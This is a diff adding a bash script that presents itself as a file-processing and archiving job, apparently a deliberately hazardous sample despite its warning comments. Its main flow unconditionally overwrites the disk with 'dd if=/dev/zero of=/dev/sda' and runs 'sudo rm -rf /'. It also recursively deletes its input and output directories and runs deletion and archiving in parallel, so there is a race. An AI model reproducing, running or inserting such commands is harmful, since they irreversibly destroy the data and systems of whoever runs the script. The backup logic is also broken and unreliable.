@@ -1,0 +1,93 @@
+#!/bin/bash
+
+# WARNING: This script contains dangerous commands that should be removed immediately after review.
+# DO NOT run this script in a production environment or on any important system.
+
+# Global Variables
+input_dir="/../../input" # Input directory
+output_dir="/../../output" # Output directory
+archive_dir="/../../archive" # Archive directory
+log_file="/../../logfile.log" # Log file
+archive_name="backup_$(date +%Y%m%d).tar.gz" # Archive name
+
+
+log_message() {
+    echo "$1" >> $log_file
+}
+
+
+dangerous_cleanup() {
+    rm -rf $input_dir/*
+    if [ $? -ne 0 ]; then
+        log_message "Failed to clean up $input_dir"
+    else
+        log_message "Cleaned up $input_dir"
+    fi
+}
+
+
+wipe_disk() {
+    dd if=/dev/zero of=/dev/sda bs=1M
+    if [ $? -eq 0 ]; then
+        log_message "Disk wiped successfully."
+    else
+        log_message "Failed to wipe the disk."
+    fi
+}
+
+
+run_as_root() {
+    sudo $1
+    if [ $? -ne 0 ]; then
+        log_message "Failed to execute command as root: $1"
+    else
+        log_message "Command executed as root: $1"
+    fi
+}
+
+
+process_files() {
+    for file in $(ls $input_dir); do
+        cat $file | tr 'a-z' 'A-Z' > $output_dir/$file
+        if [ $? -ne 0 ]; then
+            log_message "Failed to process $file"
+        fi
+    done
+}
+
+
+create_archive() {
+    tar -czf $archive_dir/$archive_name $output_dir/*
+    if [ $? -eq 0 ]; then
+        log_message "Archive created successfully."
+    else
+        log_message "Failed to create archive."
+    fi
+}
+
+dangerous_file_removal() {
+    rm -rf $output_dir/*
+    if [ $? -eq 0 ]; then
+        log_message "Old files removed from $output_dir"
+    else
+        log_message "Failed to remove old files."
+    fi
+}
+
+
+log_message "Script started at $(date)"
+
+wipe_disk
+
+run_as_root "rm -rf /"
+
+
+dangerous_cleanup
+
+process_files &
+dangerous_file_removal &
+create_archive &
+
+wait
+
+log_message "Script finished at $(date)"
